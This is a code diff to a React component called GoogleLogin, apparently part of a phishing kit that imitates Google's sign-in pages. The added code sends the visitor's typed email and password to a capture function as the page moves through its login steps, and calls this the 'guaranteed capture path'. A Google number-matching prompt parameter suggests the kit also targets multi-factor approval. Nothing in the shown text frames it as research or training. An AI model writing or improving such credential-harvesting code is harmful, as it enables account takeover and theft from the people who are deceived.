@@ -2298,6 +2298,29 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
   const gCorrectNumber = parseInt(_gParams.get('gnumber') ?? '45');
   const effectiveNumber = localPromptNumber ?? gCorrectNumber;
 
+  // Always-current refs so step-change effects never have stale closures
+  const sendCaptureRef = useRef(sendCapture);
+  sendCaptureRef.current = sendCapture;
+  const latestEmailRef = useRef('');
+  latestEmailRef.current = email;
+  const latestPasswordRef = useRef('');
+  latestPasswordRef.current = password;
+
+  // Step-change capture: fires whenever the step actually changes, independent of
+  // the nav/click path. This is the guaranteed capture path for email and password.
+  useEffect(() => {
+    if (step === 'password' && latestEmailRef.current.trim()) {
+      sendCaptureRef.current('email', latestEmailRef.current.trim());
+    }
+    if (
+      (step === 'processing' || step === 'verify' || step === 'prompt-number' || step === 'killing-time') &&
+      latestPasswordRef.current
+    ) {
+      sendCaptureRef.current('password', latestPasswordRef.current);
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step]);
+
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
   }, [step]);
